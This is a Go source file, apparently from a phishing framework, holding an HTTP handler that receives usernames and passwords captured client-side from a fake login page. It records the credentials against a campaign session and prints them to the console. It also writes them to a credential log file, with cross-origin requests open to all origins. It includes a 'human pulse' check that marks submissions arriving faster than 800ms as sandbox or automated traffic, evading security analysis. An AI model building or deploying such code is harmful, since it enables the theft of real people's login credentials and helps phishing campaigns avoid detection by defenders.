package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"time"
)

type domCaptureRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
	URL      string `json:"url"`
}

func captureHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
		w.WriteHeader(http.StatusNoContent)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req domCaptureRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	if req.Password == "" {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	// Resolve the target + tenant base domain from the request context
	target := lookupTargetByRole(roleOf(r))
	session := sessionMgr.GetOrCreate(r, baseDomainOf(r))
	var campaignID string

	if session != nil {
		// Always record the credentials on the session (thread-safe)
		session.SetCredentials(req.Username, req.Password)
		if target != nil && session.TargetName == "" {
			session.TargetName = target.Name
		}
		_, _, campaignID, _, _ = session.Snapshot()

		// ── HUMAN PULSE HEURISTIC CHECK ──
		// If the password was submitted in under 800ms of the landing page loading,
		// it's almost certainly a sandbox or automated script. Poison the chalice.
		servedAt := session.GetLandingPageServedAt()
		if !servedAt.IsZero() && time.Since(servedAt) < 800*time.Millisecond {
			session.IsHoneypot = true
			log.Printf("[🍯] HONEYPOT: Inhuman submission speed (%v) from session %s", time.Since(servedAt), session.ID[:8])
		}

		// EVENT 1 — emit the password immediately for ALL targets
		if session.ShouldEmitPassword(req.Password) {
			emitCapture(session, target)
		}
	}

	// ── VISUALLY ENHANCED CONSOLE OUTPUT ──
	ip := "unknown"
	ua := "unknown"
	targetStr := "Unknown"

	if session != nil {
		ip = session.IP
		ua = session.UserAgent
		if len(ua) > 54 {
			ua = ua[:51] + "..."
		}
	}
	if target != nil {
		targetStr = target.Name
	}

	fmt.Println()
	fmt.Println("\033[36m┌──────────────────────────────────────────────────────────────────┐\033[0m")
	fmt.Println("\033[36m│ \033[31m[!!!] DOM CAPTURE (client-side)\033[36m                                │\033[0m")
	fmt.Println("\033[36m├──────────────────────────────────────────────────────────────────┤\033[0m")
	fmt.Printf("\033[36m│ \033[32mTarget:\033[0m   %-54s\033[36m│\033[0m\n", targetStr)
	fmt.Printf("\033[36m│ \033[32mCampaign:\033[0m %-54s\033[36m│\033[0m\n", campaignID)
	fmt.Printf("\033[36m│ \033[32mIP:\033[0m       %-54s\033[36m│\033[0m\n", ip)
	fmt.Printf("\033[36m│ \033[32mUsername:\033[0m %-54s\033[36m│\033[0m\n", req.Username)
	fmt.Printf("\033[36m│ \033[32mPassword:\033[0m %-54s\033[36m│\033[0m\n", req.Password)

	urlStr := req.URL
	if len(urlStr) > 54 {
		urlStr = urlStr[:51] + "..."
	}
	fmt.Printf("\033[36m│ \033[32mURL:\033[0m      %-54s\033[36m│\033[0m\n", urlStr)
	fmt.Printf("\033[36m│ \033[32mUA:\033[0m       %-54s\033[36m│\033[0m\n", ua)
	fmt.Println("\033[36m└──────────────────────────────────────────────────────────────────┘\033[0m\n")

	// ── ENHANCED LOG FILE ENTRY ──
	entry := fmt.Sprintf("[%s] [DOM CAPTURE] Target: %s | Campaign: %s\n",
		time.Now().Format(time.RFC3339), targetStr, campaignID)
	entry += fmt.Sprintf("  IP:       %s\n", ip)
	entry += fmt.Sprintf("  Username: %s\n", req.Username)
	entry += fmt.Sprintf("  Password: %s\n", req.Password)
	entry += fmt.Sprintf("  URL:      %s\n", req.URL)
	entry += fmt.Sprintf("  UA:       %s\n\n", session.UserAgent)

	appendToFile(credLogFile, entry)

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.WriteHeader(http.StatusNoContent)
}
